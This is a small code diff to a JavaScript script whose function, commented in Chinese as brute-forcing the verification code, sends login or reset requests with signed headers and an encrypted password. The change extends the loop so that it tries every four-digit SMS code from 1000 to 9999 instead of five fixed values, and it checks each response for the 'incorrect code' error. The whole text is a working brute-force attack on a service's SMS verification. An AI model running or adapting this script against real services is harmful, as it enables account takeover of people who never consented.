@@ -52,7 +52,7 @@ async function requestMobileCode() {
 }
 
 async function traveral() {
-  for (let i = 1000; i < 1005; i++) {     // 爆破验证码
+  for (let i = 1000; i < 9999; i++) {     // 爆破验证码
     const nonce = ne()
     const timestamp = re()
     const password = encryptPassword("Test@123", timestamp, nonce)
@@ -69,7 +69,7 @@ async function traveral() {
         "Yzzh-Tsp": timestamp,
         "Yzzh-Vs": "version0",
       },
-      body: genPayload(password, phone, "1000")
+      body: genPayload(password, phone, i)
     })).json()
     if (res.error_msg == "验证码不正确") {
       console.log(`${i} 验证码不正确`)
